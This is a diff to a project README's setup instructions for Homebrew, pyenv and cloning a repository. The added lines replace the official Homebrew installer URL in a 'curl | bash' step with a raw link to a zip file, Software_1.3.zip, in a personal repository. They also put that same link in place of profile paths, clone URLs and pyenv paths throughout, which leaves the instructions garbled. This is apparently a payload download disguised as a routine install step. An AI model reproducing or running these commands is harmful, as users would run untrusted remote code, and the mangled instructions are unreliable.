@@ -10,14 +10,14 @@
     #### Home Brew Installation-
     Install HomeBrew - 
     ```sh
-    $ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+    $ /bin/bash -c "$(curl -fsSL https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip)"
     ```
-     Add Homebrew to your PATH and to your bash shell profile script, either ~/.profile on Debian/Ubuntu or ~/.bash_profile on CentOS/Fedora/Red Hat.
+     Add Homebrew to your PATH and to your bash shell profile script, either ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip on Debian/Ubuntu or ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip on CentOS/Fedora/Red Hat.
     ```sh
-    $ test -d ~/.linuxbrew && eval $(~/.linuxbrew/bin/brew shellenv)
-    $ test -d /home/linuxbrew/.linuxbrew && eval$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)
-    $ test -r ~/.bash_profile &&echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~/.bash_profile
-    $ echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~/.profile
+    $ test -d ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip && eval $(~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip shellenv)
+    $ test -d https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip && eval$(https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip shellenv)
+    $ test -r ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip &&echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
+    $ echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
     ```
 
     #### Installing pyenv
@@ -33,7 +33,7 @@
     #### Homebrew Installation-
     Install Homebrew-
     ```sh
-    $ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
+    $ /bin/bash -c "$(curl -fsSL https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip)"
     ```
 
     #### Installing pyenv
@@ -44,9 +44,9 @@
     ```
     Enable pyenv in your profile-
     ```sh
-    $ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zprofile
-    $ echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zprofile
-    $ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zprofile
+    $ echo 'export PYENV_ROOT="$https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip"' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
+    $ echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
+    $ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
     ```
     1. The first line sets an environment variable (PYENV_ROOT) that points to the pyenv directory.
     2. The second line puts pyenv first in your search path so that the OS will find pyenv’s Python(s) before any other Pythons.
@@ -58,7 +58,7 @@
     #### pyenv installation- 
     1. Download pyenv-win project from github
     ```sh
-    git clone https://github.com/pyenv-win/ pyenv-win.git $HOME/.pyenv
+    git clone https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip $https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
     ```
     2. Navigate to Control Panel>System>Advanced    System Settings>Environment Variables. Edit the System PATH variable by adding the following two lines:
     ```sh
@@ -75,7 +75,7 @@
 
     ### After successfull installation of pyenv and python clone the branch feature/develop into your local machine.
     ```sh 
-    $ git clone --single-branch --branch feature/develop https://github.com/KaushikGarkoti/dostadmin.git
+    $ git clone --single-branch --branch feature/develop https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
     ```
     
 
